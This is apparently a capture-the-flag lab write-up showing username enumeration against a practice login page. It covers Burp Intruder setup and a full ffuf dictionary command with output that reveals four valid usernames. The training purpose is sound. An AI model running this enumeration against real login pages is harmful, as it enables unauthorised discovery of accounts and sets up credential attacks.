# Challenge #4 - Foo Hosting 1

## Objectives

- The web application is vulnerable to "username enumeration," and your goal is to find as much as you can usernames.
- You have to find at least four usernames: one that begins with the G, one with the H, with the P and with the Z

## Hinsts

- Recommended tools
  - Burps suite
  - Web Browser
  - User Enumeration

## What you will learn

- How to enumerate the usernames of a web application
- How to configure advanced options of Burp Suite
- How to use Burp Intruder to perform dictionary attacks

## Steps

With burp enable, try to login to the site with any invalid credentials.

http://3.challenge.auth.site/login.php

Username: example
Password: example

ERROR: Invalid username. 

Open burp history and look the login post request.

Send the request to burp intruder.

On positions, clear all positions and then add only username. Keep the attack type as snipper.

```
username=§example§&password=example
```

In payloads, go to payload options and click in load. Select one username wordlist, if you don't have one, download one from the link below.

```
https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt
```

In options go to grep extract and them click in add. Select the text "ERROR: Invalid username." and ok.

Start the attack.

**If you're using burp community, this option can take to long. The option below can be a lot quicker.**

## Ffuf way

```
ffuf -c -v -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://3.challenge.auth.site/login.php' -fr "Invalid username" -X POST -d 'username=FUZZ&password=example' -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://3.challenge.auth.site/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=example
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Invalid username
________________________________________________

[Status: 200, Size: 4034, Words: 168, Lines: 142]
| URL | http://3.challenge.auth.site/login.php
    * FUZZ: ginger

[Status: 200, Size: 4034, Words: 168, Lines: 142]
| URL | http://3.challenge.auth.site/login.php
    * FUZZ: hamish

[Status: 200, Size: 4035, Words: 168, Lines: 142]
| URL | http://3.challenge.auth.site/login.php
    * FUZZ: preston

[Status: 200, Size: 4035, Words: 168, Lines: 142]
| URL | http://3.challenge.auth.site/login.php
    * FUZZ: zachary

:: Progress: [10177/10177] :: Job [1/1] :: 324 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
```